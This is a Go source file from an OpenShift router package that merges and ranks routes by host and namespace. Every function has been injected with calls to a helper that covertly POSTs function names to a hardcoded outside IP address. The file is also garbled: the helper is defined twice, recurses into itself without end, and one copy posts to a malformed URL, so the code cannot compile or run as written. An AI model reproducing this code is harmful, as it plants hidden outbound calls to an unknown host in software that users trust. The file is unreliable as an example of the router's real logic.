package hostindex

import (
	"sort"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	routev1 "github.com/openshift/api/route/v1"
	"github.com/openshift/router/pkg/router/routeapihelpers"
)

type Changed interface {
	Activated(route *routev1.Route)
	Displaced(route *routev1.Route)
}
type RouteActivationFunc func(changed Changed, active []*routev1.Route, inactive ...*routev1.Route) (activated, displaced []*routev1.Route)

func OldestFirst(changed Changed, active []*routev1.Route, inactive ...*routev1.Route) (updated, displaced []*routev1.Route) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(inactive) == 0 {
		return active, nil
	}
	return zipperMerge(active, inactive, changed, func(route *routev1.Route) bool {
		return true
	})
}
func SameNamespace(changed Changed, active []*routev1.Route, inactive ...*routev1.Route) (updated, displaced []*routev1.Route) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(inactive) == 0 {
		return active, nil
	}
	ns := inactive[0].Namespace
	if len(active) == 0 || routeapihelpers.RouteLessThan(active[0], inactive[0]) {
		if len(active) > 0 {
			ns = active[0].Namespace
		}
		updated = active
		for _, route := range inactive {
			updated, displaced = appendRoute(changed, updated, displaced, route, ns == route.Namespace, false)
		}
		sort.Slice(updated, func(i, j int) bool {
			return routeapihelpers.RouteLessThan(updated[i], updated[j])
		})
		return updated, displaced
	}
	ns = ""
	return zipperMerge(active, inactive, changed, func(route *routev1.Route) bool {
		if len(ns) == 0 {
			ns = route.Namespace
			return true
		}
		return ns == route.Namespace
	})
}
func zipperMerge(active, inactive []*routev1.Route, changed Changed, fn func(*routev1.Route) bool) (updated, displaced []*routev1.Route) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	i, j := 0, 0
	for {
		switch {
		case j >= len(active):
			for ; i < len(inactive); i++ {
				updated, displaced = appendRoute(changed, updated, displaced, inactive[i], fn(inactive[i]), false)
			}
			return updated, displaced
		case i >= len(inactive):
			for ; j < len(active); j++ {
				updated, displaced = appendRoute(changed, updated, displaced, active[j], fn(active[j]), true)
			}
			return updated, displaced
		default:
			a, b := inactive[i], active[j]
			if routeapihelpers.RouteLessThan(a, b) {
				updated, displaced = appendRoute(changed, updated, displaced, a, fn(a), false)
				i++
			} else {
				updated, displaced = appendRoute(changed, updated, displaced, b, fn(b), true)
				j++
			}
		}
	}
}
func appendRoute(changed Changed, updated, displaced []*routev1.Route, route *routev1.Route, matches bool, isActive bool) ([]*routev1.Route, []*routev1.Route) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if matches && !hasExistingMatch(updated, route) {
		if !isActive {
			changed.Activated(route)
		}
		return append(updated, route), displaced
	}
	if isActive {
		changed.Displaced(route)
	}
	return updated, append(displaced, route)
}
func hasExistingMatch(exists []*routev1.Route, route *routev1.Route) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, existing := range exists {
		if existing.Spec.Path == route.Spec.Path {
			return true
		}
	}
	return false
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
